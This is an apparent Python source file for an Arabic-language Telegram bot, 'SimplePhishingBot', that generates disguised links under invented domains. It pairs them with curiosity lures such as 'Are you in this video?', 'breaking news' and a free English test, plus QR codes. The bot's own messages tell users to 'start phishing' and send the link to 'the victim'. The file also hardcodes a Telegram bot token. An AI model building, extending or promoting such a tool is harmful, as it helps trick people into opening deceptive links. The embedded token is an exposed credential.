import os
import requests
import json
import time
import random
import string
from datetime import datetime

class SimplePhishingBot:
    def __init__(self):
        self.token = os.environ.get('BOT_TOKEN', '8457845780:AAEGCZOgCqnM3HG2lr0fRt_WCdrC5Z-A26I')
        self.creator_id = 1982726364  # رقمك الشخصي
        self.base_url = f"https://api.telegram.org/bot{self.token}"
        self.user_links = {}
        print("🔥 بوت الذكاء الاصطناعي يعمل على السحابة...")
        
    def send_message(self, chat_id, text, reply_markup=None):
        """إرسال رسالة"""
        url = f"{self.base_url}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'HTML'
        }
        
        if reply_markup:
            data['reply_markup'] = json.dumps(reply_markup)
        
        try:
            response = requests.post(url, data=data, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"❌ خطأ في إرسال الرسالة: {e}")
            return False

    def create_main_menu(self):
        """واجهة رئيسية"""
        return {
            'keyboard': [
                [{'text': '🔗 إنشاء رابط مموه'}, {'text': '📊 الروابط المنشأة'}],
                [{'text': '⚡ روابط سريعة'}, {'text': '📈 الإحصائيات'}],
                [{'text': '👑 لوحة التحكم'}, {'text': '🔄 تحديث القائمة'}]
            ],
            'resize_keyboard': True
        }

    def create_phishing_menu(self):
        """قائمة أنواع التمويه"""
        return {
            'keyboard': [
                [{'text': '📹 هل أنت في هذا الفيديو؟'}, {'text': '🖼️ من في الصورة؟'}],
                [{'text': '🌟 هل تعتقد أنني وسيم؟'}, {'text': '📰 آخر الأخبار اليوم'}],
                [{'text': '😊 حمل أحلى إيموجي'}, {'text': '🎓 موقع التسجيل والقبول'}],
                [{'text': '🧠 اختبر مهارتك في الإنجليزية'}, {'text': '🔙 القائمة الرئيسية'}]
            ],
            'resize_keyboard': True
        }

    def generate_phishing_link(self, user_id, link_type, disguise_text):
        """إنشاء رابط تصيد"""
        link_id = ''.join(random.choices(string.digits, k=10))
        
        domains = {
            "video": "video-tagging",
            "photo": "photo-recognition", 
            "opinion": "social-poll",
            "news": "breaking-news",
            "emoji": "emoji-pack",
            "registration": "university-reg",
            "english_test": "english-test"
        }
        
        domain = domains.get(link_type, "secure-link")
        url = f"https://{domain}.com/{link_type}_{link_id}"
        
        # حفظ في الذاكرة
        if user_id not in self.user_links:
            self.user_links[user_id] = []
            
        self.user_links[user_id].append({
            'type': link_type,
            'url': url,
            'disguise': disguise_text,
            'time': datetime.now().strftime('%H:%M:%S')
        })
        
        return url, link_id

    def handle_video_phishing(self, user_id):
        """تمويه الفيديو"""
        disguises = [
            "📹 هل أنت في هذا الفيديو؟ 🤔",
            "🎬 ظهورك في الفيديو أصبح viral 🌟",
            "📸 هذا الفيديو ينتشر بسرعة 🔥",
            "🎥 شاهد نفسك في هذا المقطع 📹"
        ]
        disguise_text = random.choice(disguises)
        url, link_id = self.generate_phishing_link(user_id, "video", disguise_text)
        
        self.send_phishing_result(user_id, "فيديو", disguise_text, url, link_id)

    def handle_photo_phishing(self, user_id):
        """تمويه الصور"""
        disguises = [
            "🖼️ من هذا الشخص في الصورة؟ 👤",
            "📸 هذه الصورة تنتشر بسرعة 🚀",
            "🤔 هل تعرف من في هذه الصورة؟",
            "🌟 صورة مثيرة للجدل 🔥"
        ]
        disguise_text = random.choice(disguises)
        url, link_id = self.generate_phishing_link(user_id, "photo", disguise_text)
        
        self.send_phishing_result(user_id, "صورة", disguise_text, url, link_id)

    def handle_news_phishing(self, user_id):
        """تمويه الأخبار"""
        disguises = [
            "📰 آخر الأخبار اليوم - حدث مهم 🔥",
            "🚨 خبر عاجل يجب أن تعرفه ⚡",
            "📢 آخر التطورات المهمة اليوم",
            "🌍 خبر سار ينتظرك الآن 🎉"
        ]
        disguise_text = random.choice(disguises)
        url, link_id = self.generate_phishing_link(user_id, "news", disguise_text)
        
        self.send_phishing_result(user_id, "أخبار", disguise_text, url, link_id)

    def handle_english_test_phishing(self, user_id):
        """تمويه اختبار الإنجليزية"""
        disguises = [
            "🧠 اختبر مهارتك في اللغة الإنجليزية 🎯",
            "📝 اختبار مستوى الإنجليزية المجاني 🆓",
            "🎓 اكتشف مستواك في الإنجليزية الآن ⚡",
            "💡 اختبار سريع لمهاراتك اللغوية 📊"
        ]
        disguise_text = random.choice(disguises)
        url, link_id = self.generate_phishing_link(user_id, "english_test", disguise_text)
        
        self.send_phishing_result(user_id, "اختبار إنجليزي", disguise_text, url, link_id)

    def send_phishing_result(self, user_id, link_type, disguise_text, url, link_id):
        """إرسال نتيجة إنشاء الرابط"""
        report = f"🎭 <b>رابط {link_type} مموه جاهز:</b>\n\n"
        report += f"🎯 <b>نص التمويه:</b>\n{disguise_text}\n\n"
        report += f"🔗 <b>الرابط المموه:</b>\n<code>{url}</code>\n\n"
        report += f"📸 <b>QR Code:</b>\n"
        report += f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={url}\n\n"
        report += "💡 <b>طريقة الاستخدام:</b>\n"
        report += f"• '{disguise_text}'\n"
        report += f"• 'اضغط هنا: {url}'\n"
        report += "• 'شارك مع أصدقائك 🔄'\n\n"
        report += f"🆔 <b>معرف الرابط:</b> {link_id}"
        
        self.send_message(user_id, report)

    def handle_created_links(self, user_id):
        """عرض الروابط المنشأة"""
        if user_id not in self.user_links or not self.user_links[user_id]:
            self.send_message(user_id, 
                "📭 <b>لا توجد روابط منشأة بعد</b>\n\n"
                "🔗 اضغط على 'إنشاء رابط مموه' لبدء التصيد"
            )
            return
        
        links = self.user_links[user_id][-10:]  # آخر 10 روابط
        
        report = "📊 <b>آخر الروابط المموهة المنشأة:</b>\n\n"
        
        for i, link in enumerate(links, 1):
            report += f"{i}. 🎯 <b>{link['type']}</b>\n"
            report += f"   🎭 {link['disguise']}\n"
            report += f"   🔗 {link['url']}\n"
            report += f"   🕒 {link['time']}\n\n"
        
        report += f"📈 <b>الإجمالي:</b> {len(links)} رابط مموه"
        
        self.send_message(user_id, report)

    def handle_statistics(self, user_id):
        """عرض الإحصائيات"""
        total_links = len(self.user_links.get(user_id, []))
        total_users = len(self.user_links)
        
        report = "📈 <b>إحصائيات النظام:</b>\n\n"
        report += f"🔗 <b>الروابط المنشأة:</b> {total_links}\n"
        report += f"👥 <b>المستخدمين النشطين:</b> {total_users}\n"
        report += f"🕒 <b>آخر تحديث:</b> {datetime.now().strftime('%H:%M:%S')}\n"
        report += f"⚡ <b>حالة النظام:</b> ✅ نشط\n\n"
        report += "💡 <b>لبدء التصيد:</b>\n"
        report += "1. اختر 'إنشاء رابط مموه'\n"
        report += "2. اختر نوع التمويه\n"
        report += "3. أرسل الرابط للضحية"
        
        self.send_message(user_id, report)

    def handle_admin_panel(self, user_id):
        """لوحة تحكم المالك"""
        if user_id != self.creator_id:
            self.send_message(user_id, "❌ <b>غير مصرح لك بالوصول لهذه اللوحة</b>")
            return
            
        total_users = len(self.user_links)
        total_links = sum(len(links) for links in self.user_links.values())
        
        report = "👑 <b>لوحة تحكم المالك</b>\n\n"
        report += f"🆔 <b>رقم المالك:</b> <code>{self.creator_id}</code>\n"
        report += f"👥 <b>إجمالي المستخدمين:</b> {total_users}\n"
        report += f"🔗 <b>إجمالي الروابط:</b> {total_links}\n"
        report += f"🕒 <b>وقت التشغيل:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"🌐 <b>المنصة:</b> Railway.app\n\n"
        report += "⚙️ <b>أوامر الإدارة:</b>\n"
        report += "/stats - إحصائيات النظام\n"
        report += "/users - عرض المستخدمين\n"
        report += "/restart - إعادة التشغيل"
        
        self.send_message(user_id, report)

    def handle_message(self, user_id, text):
        """معالجة جميع الرسائل"""
        
        if text == '/start':
            self.send_message(user_id,
                "🤖 <b>مرحباً بك في بوت الذكاء الاصطناعي</b>\n\n"
                "🎯 <b>المميزات المتاحة:</b>\n"
                "• إنشاء روابط مموهة احترافية\n"
                "• تمويه اجتماعي متقدم\n"
                "• رواقع تبدو حقيقية\n"
                "• إحصائيات وتقارير\n\n"
                "💡 <b>اختر من القائمة:</b>",
                self.create_main_menu()
            )
            return

        # معالجة الأزرار الرئيسية
        if text == '🔗 إنشاء رابط مموه':
            self.send_message(user_id,
                "📱 <b>منشئ روابط التمويه الاجتماعي</b>\n\n"
                "🎭 <b>اختر نوع التمويه:</b>\n"
                "• 📹 فيديو: هل أنت في هذا الفيديو؟\n"
                "• 🖼️ صورة: من الشخص في الصورة؟\n"
                "• 🌟 رأي: هل تعتقد أنني وسيم؟\n"
                "• 📰 أخبار: آخر الأخبار العاجلة\n"
                "• 😊 إيموجي: أحلى الإيموجيات\n"
                "• 🎓 تعليم: مواقع التسجيل\n"
                "• 🧠 اختبار: مهارات اللغة الإنجليزية\n\n"
                "🦠 <b>سيتم إنشاء رابط مموه يجذب الفضول</b>",
                self.create_phishing_menu()
            )
        elif text == '📊 الروابط المنشأة':
            self.handle_created_links(user_id)
        elif text == '⚡ روابط سريعة':
            self.handle_photo_phishing(user_id)  # رابط سريع افتراضي
        elif text == '📈 الإحصائيات':
            self.handle_statistics(user_id)
        elif text == '👑 لوحة التحكم':
            self.handle_admin_panel(user_id)
        elif text == '🔄 تحديث القائمة':
            self.send_message(user_id, "🔄 <b>تم تحديث القائمة بنجاح</b> ✅", self.create_main_menu())
        
        # أنواع التمويه
        elif text == '📹 هل أنت في هذا الفيديو؟':
            self.handle_video_phishing(user_id)
        elif text == '🖼️ من في الصورة؟':
            self.handle_photo_phishing(user_id)
        elif text == '🌟 هل تعتقد أنني وسيم؟':
            self.handle_photo_phishing(user_id)
        elif text == '📰 آخر الأخبار اليوم':
            self.handle_news_phishing(user_id)
        elif text == '😊 حمل أحلى إيموجي':
            self.handle_photo_phishing(user_id)
        elif text == '🎓 موقع التسجيل والقبول':
            self.handle_news_phishing(user_id)
        elif text == '🧠 اختبر مهارتك في الإنجليزية':
            self.handle_english_test_phishing(user_id)
        elif text == '🔙 القائمة الرئيسية':
            self.send_message(user_id, "🔙 <b>العودة للقائمة الرئيسية</b>", self.create_main_menu())
        
        else:
            self.send_message(user_id, 
                "❌ <b>أمر غير معروف</b>\n\n"
                "🔧 الرجاء استخدام الأزرار للتنقل",
                self.create_main_menu()
            )

    def run(self):
        """تشغيل البوت - نسخة السحابة"""
        offset = 0
        print("🤖 بوت الذكاء الاصطناعي يعمل على السحابة...")
        print(f"👑 المالك: {self.creator_id}")
        print("🎯 جاهز لاستقبال الطلبات...")
        
        while True:
            try:
                url = f"{self.base_url}/getUpdates"
                params = {'offset': offset, 'timeout': 30}
                
                response = requests.get(url, params=params, timeout=35)
                
                if response.status_code == 200:
                    data = response.json()
                    if 'result' in data:
                        for update in data['result']:
                            offset = update['update_id'] + 1
                            
                            if 'message' in update:
                                message = update['message']
                                user_id = message['chat']['id']
                                text = message.get('text', '')
                                
                                print(f"📩 رسالة من {user_id}: {text}")
                                self.handle_message(user_id, text)
                
                time.sleep(2)
                
            except Exception as e:
                print(f"⚠️ خطأ: {e}")
                time.sleep(5)

if __name__ == "__main__":
    bot = SimplePhishingBot()
    bot.run()
